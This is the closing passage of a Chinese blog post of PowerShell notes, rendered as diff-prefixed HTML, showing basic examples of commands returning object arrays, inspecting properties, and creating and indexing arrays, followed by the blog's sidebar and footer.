class="line"><span class="comment">   Link-local IPv6 Address . . . . . : ***</span></span><br><span class="line"><span class="comment">   IPv4 Address. . . . . . . . . . . : ***</span></span><br><span class="line"><span class="comment">   Link-local IPv6 Address . . . . . : ***</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用对象操作"><a href="#使用对象操作" class="headerlink" title="使用对象操作"></a>使用对象操作</h3><p>cmdlet命令会返回一个内容丰富的对象。例如ls，返回的数组的每一个对象是一个System.IO.DirectoryInfo对象，输出这些对象时，powershell会自动把它们转换成友好的文本格式</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">    Directory: C:Powershell</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Mode                LastWriteTime     Length Name</span></span><br><span class="line"><span class="comment">----                -------------     ------ ----</span></span><br><span class="line"><span class="comment">d----        2011/11/23     17:25            ABC</span></span><br><span class="line"><span class="comment">d----        2011/11/29     18:21            myscript</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     18:30      67580 a.html</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     20:04      26384 a.txt</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     20:26      12060 alias</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     20:27      12060 alias.ps1</span></span><br><span class="line"><span class="comment">-a---        2011/11/23     17:25          0 b.txt</span></span><br><span class="line"><span class="comment">-a---        2011/11/23     17:25          0 c.txt</span></span><br><span class="line"><span class="comment">-a---        2011/11/23     17:25          0 d.txt</span></span><br><span class="line"><span class="comment">-a---        2011/11/25     11:20        556 employee.xml</span></span><br><span class="line"><span class="comment">-a---        2011/11/29     19:23      21466 function.ps1</span></span><br><span class="line"><span class="comment">-a---        2011/11/28     11:12        186 LogoTestConfig.xml</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     17:37       7420 name.html</span></span><br><span class="line"><span class="comment">-a---        2011/11/28     15:30         63 ping.bat</span></span><br><span class="line"><span class="comment">-a---        2011/11/24     17:44     735892 Powershell_Cmdlets.html</span></span><br><span class="line"><span class="comment">-a---        2011/11/30     16:04       2556 psdrive.html</span></span><br><span class="line"><span class="comment">-a---         2011/12/2     18:47        140 test.ps1</span></span><br><span class="line"><span class="comment">-a---        2011/11/23     17:37        242 test.txt</span></span><br><span class="line"><span class="comment">-a---        2011/11/28     16:42        170 test.vbs</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$result</span>=<span class="built_in">ls</span></span><br><span class="line"><span class="variable">$result</span>.Count</span><br><span class="line"><span class="comment"># 20</span></span><br><span class="line"><span class="variable">$result</span>[<span class="number">0</span>].gettype().fullname</span><br><span class="line"><span class="comment"># System.IO.DirectoryInfo</span></span><br><span class="line">result[<span class="number">0</span>]</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">    Directory: C:Powershell</span></span><br><span class="line"><span class="comment">Mode                LastWriteTime     Length Name</span></span><br><span class="line"><span class="comment">----                -------------     ------ ----</span></span><br><span class="line"><span class="comment">d----        2011/11/23     17:25            ABC</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="comment"># 对于任何对象都可以使用Format-List *(fl *)查看所有的属性和方法</span></span><br><span class="line"><span class="variable">$result</span>[<span class="number">0</span>] | <span class="built_in">fl</span> *</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PSPath            : Microsoft.PowerShell.CoreFileSystem::C:PowershellABC</span></span><br><span class="line"><span class="comment">PSParentPath      : Microsoft.PowerShell.CoreFileSystem::C:Powershell</span></span><br><span class="line"><span class="comment">PSChildName       : ABC</span></span><br><span class="line"><span class="comment">PSDrive           : C</span></span><br><span class="line"><span class="comment">PSProvider        : Microsoft.PowerShell.CoreFileSystem</span></span><br><span class="line"><span class="comment">PSIsContainer     : True</span></span><br><span class="line"><span class="comment">BaseName          : ABC</span></span><br><span class="line"><span class="comment">Mode              : d----</span></span><br><span class="line"><span class="comment">Name              : ABC</span></span><br><span class="line"><span class="comment">Parent            : Powershell</span></span><br><span class="line"><span class="comment">Exists            : True</span></span><br><span class="line"><span class="comment">Root              : C:</span></span><br><span class="line"><span class="comment">FullName          : C:PowershellABC</span></span><br><span class="line"><span class="comment">Extension         :</span></span><br><span class="line"><span class="comment">CreationTime      : 2011/11/23 17:25:53</span></span><br><span class="line"><span class="comment">CreationTimeUtc   : 2011/11/23 9:25:53</span></span><br><span class="line"><span class="comment">LastAccessTime    : 2011/11/23 17:25:53</span></span><br><span class="line"><span class="comment">LastAccessTimeUtc : 2011/11/23 9:25:53</span></span><br><span class="line"><span class="comment">LastWriteTime     : 2011/11/23 17:25:53</span></span><br><span class="line"><span class="comment">LastWriteTimeUtc  : 2011/11/23 9:25:53</span></span><br><span class="line"><span class="comment">Attributes        : Directory</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建数组可以使用逗号，连续的数字数组有语法糖</span></span><br><span class="line"><span class="variable">$nums</span> = <span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span></span><br><span class="line"><span class="variable">$nums</span> = <span class="number">1</span>..<span class="number">5</span></span><br><span class="line"><span class="comment"># 数组可以存放不同类型的对象</span></span><br><span class="line"><span class="variable">$array</span>=<span class="number">1</span>,<span class="string">&quot;2012世界末日&quot;</span>,([<span class="type">System.Guid</span>]::NewGuid()),(<span class="built_in">get-date</span>)</span><br><span class="line"><span class="variable">$array</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2012世界末日</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Guid</span></span><br><span class="line"><span class="comment">----</span></span><br><span class="line"><span class="comment">06a88783-a181-4511-9e41-2780ecbd7924</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DisplayHint : DateTime</span></span><br><span class="line"><span class="comment">Date        : 2011/12/9 0:00:00</span></span><br><span class="line"><span class="comment">Day         : 9</span></span><br><span class="line"><span class="comment">DayOfWeek   : Friday</span></span><br><span class="line"><span class="comment">DayOfYear   : 343</span></span><br><span class="line"><span class="comment">Hour        : 14</span></span><br><span class="line"><span class="comment">Kind        : Local</span></span><br><span class="line"><span class="comment">Millisecond : 910</span></span><br><span class="line"><span class="comment">Minute      : 15</span></span><br><span class="line"><span class="comment">Month       : 12</span></span><br><span class="line"><span class="comment">Second      : 45</span></span><br><span class="line"><span class="comment">Ticks       : 634590369459101334</span></span><br><span class="line"><span class="comment">TimeOfDay   : 14:15:45.9101334</span></span><br><span class="line"><span class="comment">Year        : 2011</span></span><br><span class="line"><span class="comment">DateTime    : 2011年12月9日 14:15:45</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 空数组</span></span><br><span class="line"><span class="variable">$a</span>=<span class="selector-tag">@</span>()</span><br><span class="line"><span class="comment"># 单元素数组</span></span><br><span class="line"><span class="variable">$a</span>=,<span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="访问数组"><a href="#访问数组" class="headerlink" title="访问数组"></a>访问数组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问最后一个元素</span></span><br><span class="line"><span class="variable">$arr</span>[(<span class="variable">$arr</span><span class="type">.Count</span>-<span class="number">1</span>)]</span><br><span class="line"><span class="variable">$arr</span>[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择多个元素</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆序输出</span></span><br><span class="line"><span class="variable">$arr</span>[(<span class="variable">$arr</span><span class="type">.Count</span>)<span class="type">..0</span>]</span><br></pre></td></tr></table></figure>
+
+</div><div class="article-licensing box"><div class="licensing-title"><p>Powershell笔记</p><p><a href="http://example.com/2019/09/07/powershell/">http://example.com/2019/09/07/powershell/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-09-07</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-05-07</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Powershell/">Powershell</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/10/05/writeup/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CTF Writeup</span></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">42</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">13</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Powershell-安全问题"><span class="level-left"><span class="level-item">1</span><span class="level-item">Powershell 安全问题</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#基础"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">基础</span></span></a></li><li><a class="level is-mobile" href="#执行策略"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">执行策略</span></span></a></li><li><a class="level is-mobile" href="#绕过本地权限执行"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">绕过本地权限执行</span></span></a></li><li><a class="level is-mobile" href="#文件操作"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">文件操作</span></span></a></li><li><a class="level is-mobile" href="#远程下载-powershell-脚本并执行"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">远程下载 powershell 脚本并执行</span></span></a></li><li><a class="level is-mobile" href="#常用-powershell-命令"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">常用 powershell 命令</span></span></a></li></ul></li><li><a class="level is-mobile" href="#认识Powershell"><span class="level-left"><span class="level-item">2</span><span class="level-item">认识Powershell</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#快捷键"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">快捷键</span></span></a></li><li><a class="level is-mobile" href="#管道和重定向"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">管道和重定向</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Powershell交互式"><span class="level-left"><span class="level-item">3</span><span class="level-item">Powershell交互式</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Powershell命令集cmdlets"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">Powershell命令集cmdlets</span></span></a></li><li><a class="level is-mobile" href="#别名"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">别名</span></span></a></li><li><a class="level is-mobile" href="#调用入口优先级"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">调用入口优先级</span></span></a></li></ul></li><li><a class="level is-mobile" href="#变量"><span class="level-left"><span class="level-item">4</span><span class="level-item">变量</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#变量操作"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">变量操作</span></span></a></li><li><a class="level is-mobile" href="#自动化变量"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">自动化变量</span></span></a></li><li><a class="level is-mobile" href="#环境变量"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">环境变量</span></span></a></li><li><a class="level is-mobile" href="#驱动器变量"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">驱动器变量</span></span></a></li><li><a class="level is-mobile" href="#变量的作用域"><span class="level-left"><span class="level-item">4.5</span><span class="level-item">变量的作用域</span></span></a></li><li><a class="level is-mobile" href="#变量类型"><span class="level-left"><span class="level-item">4.6</span><span class="level-item">变量类型</span></span></a></li><li><a class="level is-mobile" href="#变量的幕后管理"><span class="level-left"><span class="level-item">4.7</span><span class="level-item">变量的幕后管理</span></span></a></li></ul></li><li><a class="level is-mobile" href="#数组和哈希表"><span class="level-left"><span class="level-item">5</span><span class="level-item">数组和哈希表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#命令返回数组"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">命令返回数组</span></span></a></li><li><a class="level is-mobile" href="#使用对象操作"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">使用对象操作</span></span></a></li><li><a class="level is-mobile" href="#创建数组"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">创建数组</span></span></a></li><li><a class="level is-mobile" href="#访问数组"><span class="level-left"><span class="level-item">5.4</span><span class="level-item">访问数组</span></span></a></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-10-04T08:35:56.000Z">2020-10-04</time></p><p class="title"><a href="/2020/10/04/java/">Java 笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-10-03T07:52:45.000Z">2020-10-03</time></p><p class="title"><a href="/2020/10/03/gopher/">Gopher 协议利用</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-21T02:09:13.000Z">2020-08-21</time></p><p class="title"><a href="/2020/08/21/node-js/">Node.js 相关</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-06T02:02:51.000Z">2020-08-06</time></p><p class="title"><a href="/2020/08/06/docker/">Docker</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-04T07:40:44.000Z">2020-08-04</time></p><p class="title"><a href="/2020/08/04/network/">计算机网络</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Powershell/"><span class="tag">Powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shell/"><span class="tag">shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tables/"><span class="tag">tables</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">3</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a><p class="is-size-7"><span>&copy; 2020 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
